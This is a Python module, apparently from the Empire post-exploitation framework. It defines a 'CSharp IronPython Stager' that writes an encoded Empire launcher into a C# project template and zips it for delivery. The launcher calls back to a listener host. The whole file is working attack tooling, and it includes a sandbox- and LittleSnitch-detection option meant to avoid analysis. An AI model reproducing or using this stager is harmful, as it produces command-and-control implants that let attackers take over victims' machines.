from lib.common import helpers
import shutil
import os

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'CSharp IronPython Stager',

            'Author': ['@elitest'],

            'Description': ('Generates a C# source zip containing an IronPython environment to execute the Empire stage0 launcher.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Host' : {
                'Description'   :   'Protocol IP and port that the listener is listening on.',
                'Required'      :   True,
                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
            },
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to output zip to.',
                'Required'      :   True,
                'Value'         :   '/tmp/launcher.src'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'False'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        host = self.options['Host']['Value']
        listenerName = self.options['Listener']['Value']
        outfile = self.options['OutFile']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        userAgent = self.options['UserAgent']['Value']

        # generate the launcher code
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:

            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
            launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")

            if launcher == "":
                print helpers.color("[!] Error in launcher command generation.")
                return ""

            else:
                directory = self.mainMenu.installPath + "/data/misc/IPYcSharpTemplateResources/"
                destdirectory = "/tmp/cmd/"

                shutil.copytree(directory,destdirectory)

                file = open(destdirectory + 'cmd/Program.cs').read()
                file = file.replace('LISTENERHOST',host)
                file = file.replace('STAGER',launcher)
                open(destdirectory + 'cmd/Program.cs','w').write(file)
                shutil.make_archive(outfile,'zip',destdirectory)
                shutil.rmtree(destdirectory)
                return "[*] Stager output written out to: "+outfile+".zip"
